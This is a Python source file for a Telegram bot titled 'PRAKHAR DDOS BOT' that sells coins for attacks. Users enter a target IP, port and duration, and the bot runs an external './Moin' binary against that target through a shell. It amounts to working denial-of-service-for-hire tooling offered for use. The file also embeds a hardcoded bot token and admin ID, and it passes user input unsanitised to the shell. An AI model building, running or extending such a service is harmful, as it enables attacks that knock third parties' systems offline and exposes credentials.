import os
import telebot
import subprocess
import datetime
import threading
import json
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

bot = telebot.TeleBot('8089133554:AAFnPb7_Eh5AyWwBTeU2IZLN_a-qa1ZG6pA')

# Admin user IDs
admin_id = ["7409754329"]

# File to store user data (coins, registration date, etc.)
USER_DATA_FILE = "users_data.json"
LOG_FILE = "log.txt"

# Global cooldown duration (in seconds)
GLOBAL_COOLDOWN = 80

# Last attack timestamp (shared across all users)
last_attack_time = None

# Load user data from JSON file
def load_user_data():
    if os.path.exists(USER_DATA_FILE):
        with open(USER_DATA_FILE, "r") as file:
            return json.load(file)
    else:
        return {}

# Save user data to JSON file
def save_user_data(data):
    with open(USER_DATA_FILE, "w") as file:
        json.dump(data, file, indent=4)

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Function to handle the reply when free users run the /attack command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target}\n𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {time} 𝗦𝗲𝗰𝗼𝗻𝗱𝘀\n𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿 𝗡𝗮𝗺𝗲: @{username}\n\n"
    bot.reply_to(message, response)

# Function to check if the cooldown has passed
def is_cooldown_over():
    global last_attack_time
    if last_attack_time is None:
        return True  # No previous attack, cooldown not needed
    elapsed_time = (datetime.datetime.now() - last_attack_time).total_seconds()
    return elapsed_time >= GLOBAL_COOLDOWN

# Function to handle the attack in a separate thread
def process_attack(message, target, port, time):
    user_id = str(message.chat.id)
    user_data = load_user_data()
    
    # Deduct coins for the attack
    if user_data.get(user_id, {}).get('coins', 0) < 5:
        bot.reply_to(message, "❗️𝗬𝗼𝘂 𝗱𝗼 𝗻𝗼𝘁 𝗵𝗮𝘃𝗲 𝗲𝗻𝗼𝗴𝘂𝗵 𝗰𝗼𝗶𝗻𝘀 𝘁𝗼 𝗮𝘁𝘁𝗮𝗰𝗸❗️")
        return

    # Deduct 5 coins for the attack
    user_data[user_id]['coins'] -= 5
    save_user_data(user_data)  # Save updated data
    
    # Record the command and start the attack
    record_command_logs(user_id, '/attack', target, port, time)
    
    # Show the attack sent reply first
    start_attack_reply(message, target, port, time)
    
    # Execute the attack
    full_command = f"./Moin {target} {port} {time}"
    try:
        subprocess.run(full_command, shell=True, check=True)
    except subprocess.CalledProcessError:
        bot.reply_to(message, "❗️ 𝗘𝗿𝗿𝗼𝗿: 𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝗲𝘅𝗲𝗰𝘂𝘁𝗲 𝘁𝗵𝗲 𝗮𝘁𝘁𝗮𝗰𝗸 ❗️")
        return
    
    # Send the Attack Completed message
    response_completed = "𝗔𝘁𝘁𝗮𝗰𝗸 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱 ✅"
    bot.reply_to(message, response_completed)

# Function to show the attack, info, and buy coins buttons
def show_main_buttons(message):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    attack_button = KeyboardButton("🚀 Attack")
    info_button = KeyboardButton("ℹ️ Info")
    buy_coins_button = KeyboardButton("💰 Buy Coins")
    markup.add(attack_button, info_button, buy_coins_button)
    
    bot.send_message(message.chat.id, "🔹 WELCOME TO PRAKHAR DDOS BOT 🔹", reply_markup=markup)

# Handler for /start command
@bot.message_handler(commands=['start'])
def handle_start(message):
    show_main_buttons(message)

# Handler for attack button press
@bot.message_handler(func=lambda message: message.text.lower() == "🚀 attack")
def handle_attack_button_press(message):
    user_id = str(message.chat.id)

    user_data = load_user_data()
    
    if user_id not in user_data:
        user_data[user_id] = {"coins": 0, "registered_on": str(datetime.datetime.now())}
        save_user_data(user_data)

    # Check if the cooldown period is active
    if not is_cooldown_over():
        remaining_cooldown = GLOBAL_COOLDOWN - (datetime.datetime.now() - last_attack_time).total_seconds()
        bot.reply_to(message, f"⏳ 𝗧𝗵𝗲𝗿𝗲 𝗶𝘀 𝗮𝗻 𝗮𝘁𝘁𝗮𝗰𝗸 𝗶𝗻 𝗽𝗿𝗼𝗴𝗿𝗲𝘀𝘀. 𝘄𝗮𝗶𝘁 {int(remaining_cooldown)} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 ⏳")
        return

    # Ask for target, port, and time
    bot.reply_to(message, "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 𝗜𝗣, 𝗽𝗼𝗿𝘁, 𝗮𝗻𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝘀𝗲𝗽𝗮𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝘀𝗽𝗮𝗰𝗲𝘀")

    # Wait for the user's next input
    bot.register_next_step_handler(message, process_attack_input)

def process_attack_input(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    
    if len(command) == 3:
        target = command[0]
        try:
            port = int(command[1])  # Convert port to integer
            time = int(command[2])  # Convert time to integer
        except ValueError:
            bot.reply_to(message, "❗️ 𝗘𝗿𝗿𝗼𝗿: 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗽𝗼𝗿𝘁 𝗼𝗿 𝘁𝗶𝗺𝗲 𝗳𝗼𝗿𝗺𝗮𝘁❗️")
            return
        
        if time > 250:
            response = "❗️𝗘𝗿𝗿𝗼𝗿: 𝘂𝘀𝗲 𝗹𝗲𝘀𝘀 𝘁𝗵𝗮𝗻 250 𝘀𝗲𝗰𝗼𝗻𝗱𝘀❗️"
            bot.reply_to(message, response)
            return

        # Update the last attack timestamp
        global last_attack_time
        last_attack_time = datetime.datetime.now()

        # Start the attack in a separate thread
        attack_thread = threading.Thread(target=process_attack, args=(message, target, port, time))
        attack_thread.start()
    else:
        response = "❗️𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗳𝗼𝗿𝗺𝗮𝘁❗️"
        bot.reply_to(message, response)

# Handler for buy coins button press
@bot.message_handler(func=lambda message: message.text.lower() == "💰 buy coins")
def handle_buy_coins(message):
    user_id = str(message.chat.id)

    # Admin will approve purchase
    if user_id in admin_id:
        bot.reply_to(message, "💰 𝗣𝗹𝗲𝗮𝘀𝗲 𝗽𝗿𝗼𝘃𝗶𝗱𝗲 𝘁𝗵𝗲 𝘂𝘀𝗲𝗿'𝘀 𝗜𝗗 𝗮𝗻𝗱 𝘁𝗵𝗲 𝗮𝗺𝗼𝘂𝗻𝘁 𝗼𝗳 𝗰𝗼𝗶𝗻𝘀.")
        bot.register_next_step_handler(message, process_buy_coins)
    else:
        bot.reply_to(message, "💰 𝗗𝗠 𝗧𝗢 𝗕𝗨𝗬 𝗖𝗢𝗜𝗡𝗦 @SHIVAMXRAJ")

def process_buy_coins(message):
    admin_id = str(message.chat.id)
    data = message.text.split()
    if len(data) == 2:
        user_id = data[0]
        try:
            coins = int(data[1])
        except ValueError:
            bot.reply_to(message, "❗️ 𝗘𝗿𝗿𝗼𝗿: 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗰𝗼𝗶𝗻 𝗮𝗺𝗼𝘂𝗻𝘁❗️")
            return

        user_data = load_user_data()

        if user_id not in user_data:
            bot.reply_to(message, f"❗️ 𝗘𝗿𝗿𝗼𝗿: 𝗨𝘀𝗲𝗿 {user_id} 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱❗️")
            return

        # Add coins to user
        user_data[user_id]['coins'] += coins
        save_user_data(user_data)

        bot.reply_to(message, f"✅ 𝗖𝗼𝗶𝗻𝘀 𝗳𝗼𝗿 𝗨𝘀𝗲𝗿 {user_id} 𝗵𝗮𝘃𝗲 𝗯𝗲𝗲𝗻 𝗮𝗱𝗱𝗲𝗱. 𝗧𝗵𝗲𝗶𝗿 𝗻𝗲𝘄 𝗯𝗮𝗹𝗮𝗻𝗰𝗲: {user_data[user_id]['coins']} 𝗰𝗼𝗶𝗻𝘀.")

# Function to initialize the user data when the bot starts
@bot.message_handler(commands=['init'])
def initialize_user_data(message):
    user_data = load_user_data()
    user_id = str(message.chat.id)
    
    if user_id not in user_data:
        user_data[user_id] = {"coins": 0, "registered_on": str(datetime.datetime.now())}
        save_user_data(user_data)
        bot.reply_to(message, f"✅ 𝗬𝗼𝘂 𝗵𝗮𝘃𝗲 𝗯𝗲𝗲𝗻 𝗿𝗲𝗴𝗶𝘀𝘁𝗲𝗿𝗲𝗱. 𝗬𝗼𝘂 𝗰𝗼𝗻𝘁𝗮𝗶𝗻 {user_data[user_id]['coins']} 𝗰𝗼𝗶𝗻𝘀.")
    else:
        bot.reply_to(message, "❗️ 𝗬𝗼𝘂 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗵𝗮𝘃𝗲 𝗮𝗻 𝗮𝗰𝗰𝗼𝘂𝗻𝘁. 𝗩𝗶𝘀𝗶𝘁 𝗬𝗼𝘂𝗿 𝗜𝗻𝗳𝗼.")
        
# Handler for info button press
@bot.message_handler(func=lambda message: message.text.lower() == "ℹ️ info")
def handle_info_button_press(message):
    user_id = str(message.chat.id)
    user_data = load_user_data()

    if user_id not in user_data:
        # Initialize user if they don't exist
        user_data[user_id] = {"coins": 0, "registered_on": str(datetime.datetime.now())}
        save_user_data(user_data)
    
    # Get user info
    username = message.from_user.username if message.from_user.username else "N/A"
    user_status = "Admin" if user_id in admin_id else "User"
    coins = user_data[user_id]['coins']
    
    # Format the info message
    user_info = (
        f"👤 𝗠𝗬 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 👤\n\n"
        f"💼 𝗦𝘁𝗮𝘁𝘂𝘀: {user_status}\n"
        f"🔑 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: @{username}\n"
        f"🆔 𝗨𝘀𝗲𝗿𝗜𝗗: {user_id}\n"
        f"💰 𝗖𝗼𝗶𝗻𝘀: {coins}\n"
    )
    
    # Send the user info message
    bot.reply_to(message, user_info)
    
@bot.message_handler(commands=['logs'])
def send_logs(message):
    user_id = str(message.chat.id)
    
    # Check if the user is an admin
    if user_id in admin_id:
        # Verify that the log file exists and can be read
        if os.path.exists(LOG_FILE):
            try:
                # Open and send the log file
                with open(LOG_FILE, "rb") as log_file:
                    bot.send_document(message.chat.id, log_file)
            except Exception as e:
                # In case of an error (file reading issues, permission problems, etc.)
                bot.reply_to(message, f"❌ 𝗘𝗿𝗿𝗼𝗿 𝗿𝗲𝗮𝗱𝗶𝗻𝗴 𝗹𝗼𝗴 𝗳𝗶𝗹𝗲: {str(e)} ❌")
        else:
            bot.reply_to(message, "❌ 𝗟𝗼𝗴 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱 ❌")
    else:
        # If the user is not an admin
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗱𝗼 𝗻𝗼𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻 𝘁𝗼 𝗮𝗰𝗰𝗲𝘀𝘀 𝘁𝗵𝗲 𝗹𝗼𝗴𝘀 🚫")

# Start polling
bot.polling(none_stop=True)
